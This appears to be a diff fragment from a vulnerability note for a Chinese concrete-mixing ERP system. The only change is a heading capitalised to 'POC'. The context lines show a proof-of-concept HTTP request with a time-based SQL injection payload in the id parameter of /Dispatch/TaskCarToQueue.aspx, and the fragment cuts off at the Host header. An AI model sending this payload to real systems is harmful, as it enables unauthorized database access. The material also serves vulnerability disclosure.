@@ -7,7 +7,7 @@
 title="商混ERP系统"
 ```
 
-## poc
+## POC
 ```javascript
 GET /Dispatch/TaskCarToQueue.aspx?action=addqueue&id=%27WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
 Host: 
